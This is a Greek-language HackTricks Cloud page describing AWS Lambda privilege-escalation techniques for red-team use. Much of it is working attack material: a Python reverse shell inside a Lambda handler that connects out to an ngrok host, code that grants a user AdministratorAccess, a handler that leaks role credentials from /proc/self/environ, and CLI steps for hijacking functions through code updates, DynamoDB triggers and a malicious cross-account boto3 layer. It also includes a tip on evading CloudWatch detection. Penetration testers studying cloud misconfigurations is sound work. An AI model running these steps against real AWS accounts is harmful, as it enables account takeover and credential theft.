# AWS - Προνομιούχα Εξάπλωση στο Lambda

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## lambda

Περισσότερες πληροφορίες για το lambda στο:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Οι χρήστες με τα δικαιώματα **`iam:PassRole`, `lambda:CreateFunction`, και `lambda:InvokeFunction`** μπορούν να εξαπλώσουν τα προνόμιά τους.\
Μπορούν να **δημιουργήσουν μια νέα συνάρτηση Lambda και να της αναθέσουν έναν υπάρχοντα ρόλο IAM**, δίνοντας στη συνάρτηση τα προνόμια που συνδέονται με αυτόν τον ρόλο. Ο χρήστης μπορεί στη συνέχεια να **γράψει και να ανεβάσει κώδικα σε αυτήν τη συνάρτηση Lambda (με έναν αντίστροφο κέλυφος για παράδειγμα)**.\
Μόλις η συνάρτηση είναι εγκατεστημένη, ο χρήστης μπορεί να **ενεργοποιήσει την εκτέλεσή της** και τις επιθυμητές ενέργειες καλώντας τη συνάρτηση Lambda μέσω του AWS API. Με αυτήν την προσέγγιση, ο χρήστης μπορεί αποτελεσματικά να εκτελέσει εργασίες έμμεσα μέσω της συνάρτησης Lambda, λειτουργώντας με το επίπεδο πρόσβασης που έχει ο ρόλος IAM που τη συνοδεύει.\

Ένας επιτιθέμενος μπορεί να καταχραστεί αυτό για να αποκτήσει έναν **αντίστροφο κέλυφος και να κλέψει το διακριτικό**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Μπορείτε επίσης να **καταχραστείτε τα δικαιώματα του ρόλου του lambda** από την ίδια τη λειτουργία lambda.\
Αν ο ρόλος του lambda έχει επαρκή δικαιώματα, μπορείτε να τα χρησιμοποιήσετε για να σας παραχωρήσει δικαιώματα διαχειριστή:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Είναι επίσης δυνατό να διαρρεύσουν οι διαπιστευτήρια του ρόλου του λάμδα χωρίς να χρειάζεται εξωτερική σύνδεση. Αυτό θα ήταν χρήσιμο για τις **Δικτυακά απομονωμένες Λάμδα** που χρησιμοποιούνται για εσωτερικές εργασίες. Εάν υπάρχουν άγνωστα ομάδες ασφαλείας που φιλτράρουν τα αντίστροφα κελύφη, αυτό το τμήμα κώδικα θα σας επιτρέψει να διαρρεύσετε απευθείας τα διαπιστευτήρια ως έξοδο της λάμδα.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Πιθανές Επιπτώσεις:** Άμεση αύξηση προνομίων στον καθορισμένο ρόλο υπηρεσίας lambda.

{% hint style="danger" %}
Σημειώστε ότι ακόμα κι αν φαίνεται ενδιαφέρον το **`lambda:InvokeAsync`**, **δεν** επιτρέπει από μόνο του την εκτέλεση της εντολής `aws lambda invoke-async`, χρειάζεστε επίσης το `lambda:InvokeFunction`.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Όπως και στο προηγούμενο σενάριο, μπορείτε να **χορηγήσετε στον εαυτό σας την άδεια `lambda:InvokeFunction`** αν έχετε την άδεια **`lambda:AddPermission`**.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Πιθανές Επιπτώσεις:** Άμεση ανέλιξη προνομίων στον καθορισμένο ρόλο υπηρεσίας lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Οι χρήστες με δικαιώματα **`iam:PassRole`, `lambda:CreateFunction` και `lambda:CreateEventSourceMapping`** (και πιθανώς `dynamodb:PutItem` και `dynamodb:CreateTable`) μπορούν να αναβαθμίσουν έμμεσα τα προνόμια ακόμη και χωρίς το `lambda:InvokeFunction`.\
Μπορούν να δημιουργήσουν μια συνάρτηση Lambda με κακόβουλο κώδικα και να της αναθέσουν έναν υπάρχοντα ρόλο IAM.

Αντί να καλέσουν απευθείας τη Lambda, ο χρήστης δημιουργεί ή χρησιμοποιεί μια υπάρχουσα πίνακα DynamoDB, συνδέοντάς την με τη Lambda μέσω ενός χαρτογραφημένου γεγονότος πηγής. Αυτή η ρύθμιση εξασφαλίζει ότι η συνάρτηση Lambda θα εκτελείται αυτόματα κάθε φορά που εισάγεται ένα νέο στοιχείο στον πίνακα, είτε από την ενέργεια του χρήστη είτε από άλλη διαδικασία, εκτελώντας έτσι έμμεσα τη συνάρτηση Lambda και εκτελώντας τον κώδικα με τα δικαιώματα του περασμένου ρόλου IAM.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Εάν το DynamoDB είναι ήδη ενεργό στο περιβάλλον του AWS, ο χρήστης χρειάζεται μόνο να **δημιουργήσει την αντιστοίχιση πηγής γεγονότων** για τη λειτουργία Lambda. Ωστόσο, εάν το DynamoDB δεν χρησιμοποιείται, ο χρήστης πρέπει να **δημιουργήσει έναν νέο πίνακα** με ενεργοποιημένη τη ροή γεγονότων:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Τώρα είναι δυνατό να συνδέσετε τη συνάρτηση Lambda με τον πίνακα DynamoDB δημιουργώντας έναν χαρτογράφηση πηγής συμβάντος:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Με τη συνάρτηση Lambda που συνδέεται με τη ροή DynamoDB, ο επιτιθέμενος μπορεί να **ενεργοποιήσει έμμεσα τη Lambda ενεργοποιώντας τη ροή DynamoDB**. Αυτό μπορεί να επιτευχθεί **εισάγοντας ένα στοιχείο** στον πίνακα DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Πιθανές Επιπτώσεις:** Άμεση ανέλιξη προνομίων στον καθορισμένο ρόλο υπηρεσίας lambda.

### `lambda:AddPermission`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να **χορηγήσει στον εαυτό του (ή σε άλλους) οποιεσδήποτε άδειες** (αυτό δημιουργεί πολιτικές που βασίζονται στον πόρο για τη χορήγηση πρόσβασης στον πόρο):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Πιθανές Επιπτώσεις:** Άμεση αύξηση προνομίων στον ρόλο υπηρεσίας του Lambda με την άδεια να τροποποιήσει τον κώδικα και να τον εκτελέσει.

### `lambda:AddLayerVersionPermission`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να **χορηγήσει στον εαυτό του (ή σε άλλους) την άδεια `lambda:GetLayerVersion`**. Θα μπορούσε να έχει πρόσβαση στο layer και να αναζητήσει ευπάθειες ή ευαίσθητες πληροφορίες.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Πιθανές Επιπτώσεις:** Πιθανή πρόσβαση σε ευαίσθητες πληροφορίες.

### `lambda:UpdateFunctionCode`

Οι χρήστες που διαθέτουν την άδεια **`lambda:UpdateFunctionCode`** έχουν τη δυνατότητα να **τροποποιήσουν τον κώδικα μιας υπάρχουσας συνάρτησης Lambda που συνδέεται με έναν ρόλο IAM.**\
Ο επιτιθέμενος μπορεί να **τροποποιήσει τον κώδικα της λειτουργίας για να διαρρεύσει τα διαπιστευτήρια IAM**.

Αν και ο επιτιθέμενος μπορεί να μην έχει την άμεση δυνατότητα να εκτελέσει τη συνάρτηση, εάν η συνάρτηση Lambda είναι προϋπάρχουσα και λειτουργική, είναι πιθανό να ενεργοποιηθεί μέσω υπαρχόντων ροών εργασίας ή γεγονότων, διευκολύνοντας έτσι έμμεσα την εκτέλεση του τροποποιημένου κώδικα.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Πιθανές Επιπτώσεις:** Άμεση αύξηση προνομίων στον ρόλο υπηρεσίας του Lambda που χρησιμοποιείται.

### `lambda:UpdateFunctionConfiguration`

#### Εισαγωγή

Τα [**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) επιτρέπουν την συμπερίληψη **κώδικα** στη λειτουργία του λειτουργίας σας, αλλά **αποθηκεύοντάς τον ξεχωριστά**, έτσι ώστε ο κώδικας της λειτουργίας να παραμείνει μικρός και να μπορούν να κοινοποιούνται κώδικες από πολλές λειτουργίες.

Μέσα στο Lambda μπορείτε να ελέγξετε τα μονοπάτια από όπου φορτώνεται ο κώδικας Python με μια συνάρτηση όπως η παρακάτω:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Αυτά είναι τα μέρη:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Για παράδειγμα, η βιβλιοθήκη boto3 φορτώνεται από το `/var/runtime/boto3` (4η θέση).

#### Εκμετάλλευση

**Η προσάρτηση ενός επιπέδου σε μια συνάρτηση** απαιτεί μόνο την άδεια `lambda:UpdateFunctionConfiguration` και **τα επίπεδα μπορούν να κοινοποιηθούν μεταξύ λογαριασμών**. Θα χρειαζόμαστε επίσης να γνωρίζουμε **ποιες βιβλιοθήκες χρησιμοποιούν**, ώστε να τις αντικαταστήσουμε σωστά, αλλά σε αυτό το παράδειγμα, θα υποθέσουμε απλά ότι η προσβεβλημένη συνάρτηση εισάγει την boto3.

Για να είμαστε ασφαλείς, θα χρησιμοποιήσουμε το Pip για να εγκαταστήσουμε την ίδια έκδοση της βιβλιοθήκης boto3 από το runtime του Lambda που στοχεύουμε (Python 3.7), απλά για να μην υπάρχει τίποτα διαφορετικό που θα μπορούσε να προκαλέσει προβλήματα στην προοριζόμενη συνάρτηση. Αυτή τη στιγμή, το runtime χρησιμοποιεί την έκδοση 1.9.42 της boto3.

Με τον παρακάτω κώδικα, θα εγκαταστήσουμε την έκδοση 1.9.42 της boto3 και τις εξαρτήσεις της σε ένα τοπικό φάκελο "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Στη συνέχεια, θα ανοίξουμε το αρχείο `/lambda_layer/boto3/__init__.py` και θα προσθέσουμε το κακόβουλο κώδικα. Το payload που θα προσθέσουμε φαίνεται ως εξής:

![](<../../../.gitbook/assets/image (26).png>)

Το `requests` εισάγεται από το `botocore`. Η συνάρτηση θα εξαγάγει μεταβλητές περιβάλλοντος και οι δοκιμή-εξαίρεση και ο χρόνος αναμονής 0.1 υπάρχουν για να διασφαλίσουν ότι αυτός ο κώδικας δεν θα προκαλέσει προβλήματα.

{% hint style="info" %}
**Σημαντική σημείωση:** Δεν πρέπει πλέον να χρησιμοποιείτε `from botocore.vendored import requests` σε πραγματικά pentests, επειδή θα εμφανιστεί ένα "DeprecationWarning" στα CloudWatch logs της συγκεκριμένης συνάρτησης, το οποίο πιθανόν θα οδηγήσει στον εντοπισμό σας από έναν αμυντικό.
{% endhint %}

Τώρα, συμπιέστε αυτόν τον κώδικα σε ένα **αρχείο ZIP** και **ανεβάστε το** σε ένα **νέο Lambda layer στον λογαριασμό του ΕΠΙΤΙΘΕΜΕΝΟΥ**. Θα πρέπει πρώτα να δημιουργήσετε έναν φάκελο "python" και να τοποθετήσετε τις βιβλιοθήκες σας εκεί, έτσι ώστε μόλις το ανεβάσετε στο Lambda, ο κώδικας θα βρεθεί στη διαδρομή "/opt/python/boto3". Επίσης, βεβαιωθείτε ότι το layer είναι συμβατό με την Python 3.7 και ότι το **layer βρίσκεται στην ίδια περιοχή με τη στόχος συνάρτησή μας**. Αφού ολοκληρωθεί αυτό, θα χρησιμοποιήσουμε το `lambda:AddLayerVersionPermission` για να **καταστήσουμε το layer δημόσια προσβάσιμο**, έτσι ώστε ο λογαριασμός στόχος μας να μπορεί να το χρησιμοποιήσει. Χρησιμοποιήστε τα προσωπικά σας διαπιστευτήρια AWS για αυτήν την κλήση του API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Τώρα με τα **υποκλεπτόμενα διαπιστευτήρια** που έχουμε, θα εκτελέσουμε την παρακάτω εντολή στην στόχο μας Lambda συνάρτηση "s3-getter", η οποία θα **συνδέσει το cross-account Lambda layer** μας.
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
Το επόμενο βήμα θα ήταν είτε να **εκτελέσουμε τη συνάρτηση** μόνοι μας αν μπορούμε, είτε να περιμένουμε μέχρι να **κληθεί** με κανονικό τρόπο - που είναι η ασφαλέστερη μέθοδος.

Μια **πιο αόρατη μέθοδος εκμετάλλευσης αυτής της ευπάθειας** μπορεί να βρεθεί στο:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Πιθανές Επιπτώσεις:** Άμεση αύξηση προνομίων στον ρόλο υπηρεσίας της λειτουργίας.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Ίσως με αυτές τις άδειες να μπορείτε να δημιουργήσετε μια συνάρτηση και να την εκτελέσετε καλώντας το URL... αλλά δεν μπόρεσα να βρω έναν τρόπο να το ελέγξω, οπότε πείτε μου αν εσείς μπορείτε!

### Lambda MitM

Ορισμένες λειτουργίες θα λαμβάνουν **ευαίσθητες πληροφορίες από τους χρήστες στις παραμέτρους.** Αν καταφέρετε να έχετε RCE σε μία από αυτές, μπορείτε να εξαγάγετε τις πληροφορίες που οι άλλοι χρήστες στέλνουν σε αυτήν, ελέγξτε το εδώ:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Αναφορές

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
